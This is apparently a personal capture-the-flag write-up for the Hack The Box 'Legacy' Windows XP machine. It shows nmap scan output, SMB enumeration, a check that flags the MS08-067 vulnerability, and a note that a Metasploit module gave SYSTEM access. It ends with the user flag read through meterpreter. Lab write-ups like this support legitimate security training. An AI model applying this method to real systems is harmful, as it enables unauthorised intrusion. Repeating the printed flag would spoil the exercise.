# Enumerate

## Scan

```
pat@kali:~/Desktop/Cert_Prep/htb/Windows/Legacy$ scan 10.10.10.4
==================================
Found ports: 139,445,3389
==================================
Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-09 14:48 EDT
Stats: 0:01:08 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 99.63% done; ETC: 14:49 (0:00:00 remaining)
Nmap scan report for 10.10.10.4
Host is up (0.026s latency).

PORT     STATE  SERVICE       VERSION
139/tcp  open   netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open   microsoft-ds  Windows XP microsoft-ds
3389/tcp closed ms-wbt-server
Service Info: OSs: Windows, Windows XP; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_xp

Host script results:
|_clock-skew: mean: -4h26m04s, deviation: 2h07m16s, median: -5h56m04s
|_nbstat: NetBIOS name: LEGACY, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:b9:ba:b6 (VMware)
| smb-os-discovery: 
|   OS: Windows XP (Windows 2000 LAN Manager)
|   OS CPE: cpe:/o:microsoft:windows_xp::-
|   Computer name: legacy
|   NetBIOS computer name: LEGACY\x00
|   Workgroup: HTB\x00
|_  System time: 2020-06-09T18:52:36+03:00
| smb-security-mode: 
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_smb2-time: Protocol negotiation failed (SMB2)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 70.67 seconds
```

## Enumerate ports

* If it's really win xp there's probably some exploits. OS scan confirms. 

```
Aggressive OS guesses: Microsoft Windows 2000 SP2 - SP4, Windows XP SP2 - SP3, or Windows Server 2003 SP0 - SP2 (93%), Microsoft Windows 2000 SP4 (93%), Microsoft Windows XP SP3 (92%), Microsoft Windows Server 2003 SP2 (x64) (92%), Microsoft Windows XP Professional (92%), Microsoft Windows 2000 SP4 or Windows XP SP2 - SP3 (92%), Microsoft Windows XP SP2 (92%), Microsoft Windows 2000 SP0/SP2/SP4 or Windows XP SP0/SP1 (92%), Microsoft Windows 2000 SP1 (92%), Microsoft Windows 2000 SP2 (92%)
No exact OS matches for host (test conditions non-ideal).
```

* Try to smb-enum-shares

```
pat@kali:~/Desktop/Cert_Prep/htb/Windows/Legacy$ nmap --script smb-enum-shares.nse -p445 -Pn 10.10.10.4 
Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-09 14:54 EDT
Nmap scan report for 10.10.10.4
Host is up (0.027s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds

Host script results:
| smb-enum-shares: 
|   note: ERROR: Enumerating shares failed, guessing at common ones (NT_STATUS_ACCESS_DENIED)
|   account_used: <blank>
|   \\10.10.10.4\ADMIN$: 
|     warning: Couldn't get details for share: NT_STATUS_ACCESS_DENIED
|     Anonymous access: <none>
|   \\10.10.10.4\C$: 
|     warning: Couldn't get details for share: NT_STATUS_ACCESS_DENIED
|     Anonymous access: <none>
|   \\10.10.10.4\IPC$: 
|     warning: Couldn't get details for share: NT_STATUS_ACCESS_DENIED
|_    Anonymous access: READ

Nmap done: 1 IP address (1 host up) scanned in 36.92 seconds
```

* That doesn't seem helpful. Maybe I can enum users? Didn't give anything. Regular smbclient commands get negotiation failed? Was getting protocol negotiation failed:

```
pat@kali:~/Desktop/Cert_Prep/htb/Windows/Legacy$ smbclient -L //10.10.10.4
protocol negotiation failed: NT_STATUS_IO_TIMEOUT
```

* Solved it with this I think: https://www.reddit.com/r/oscp/comments/fg956k/kali2020_htb_smbclient_protocol_negotiation/
  * Go to ur /etc/samba/smb.conf file and add the  following, client min protocol = NT1. Under the global section. 

# Access

* Lets see if the smb is vulnerable to an exploit

```
pat@kali:~/Desktop/Cert_Prep/htb/Windows/Legacy$ nmap --script smb-vuln-ms08-067.nse -p445 10.10.10.4 -Pn 
Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-09 15:09 EDT
Nmap scan report for 10.10.10.4
Host is up (0.028s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds

Host script results:
| smb-vuln-ms08-067: 
|   VULNERABLE:
|   Microsoft Windows system vulnerable to remote code execution (MS08-067)
|     State: LIKELY VULNERABLE
|     IDs:  CVE:CVE-2008-4250
|           The Server service in Microsoft Windows 2000 SP4, XP SP2 and SP3, Server 2003 SP1 and SP2,
|           Vista Gold and SP1, Server 2008, and 7 Pre-Beta allows remote attackers to execute arbitrary
|           code via a crafted RPC request that triggers the overflow during path canonicalization.
|           
|     Disclosure date: 2008-10-23
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-4250
|_      https://technet.microsoft.com/en-us/library/security/ms08-067.aspx

Nmap done: 1 IP address (1 host up) scanned in 16.42 seconds
```

* Search for a script and find one to use. 

```
Microsoft Windows - 'NetAPI32.dll' Code Execution (Python) (MS08-067) | exploits/windows/remote/40279.py
```

* Apparently that probably doesn't work because it's not actually specifying the right version of the OS. It's XP and not server. Can use the msf check module at least I guess? 

```
pat@kali:~/Desktop/Cert_Prep/htb/Windows/Legacy$ nmap --script smb-os-discovery.nse -p445 10.10.10.4 -Pn
Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-09 15:36 EDT
Nmap scan report for 10.10.10.4
Host is up (0.030s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds

Host script results:
| smb-os-discovery: 
|   OS: Windows XP (Windows 2000 LAN Manager)
|   OS CPE: cpe:/o:microsoft:windows_xp::-
|   Computer name: legacy
|   NetBIOS computer name: LEGACY\x00
|   Workgroup: HTB\x00
|_  System time: 2020-06-09T19:41:06+03:00

Nmap done: 1 IP address (1 host up) scanned in 13.67 seconds
```

* So I should have known that the server things weren't going to work. 

* Use the metasploit module, get system and the flags. 

```
meterpreter > search -f user.txt
Found 1 result...
    c:\Documents and Settings\john\Desktop\user.txt (32 bytes)
meterpreter > cat "c:\Documents and Settings\john\Desktop\user.txt"
e69af0e4f443de7e36876fda4ec7644f
```



# Lessons

* Check OS before launching shit at SMB. 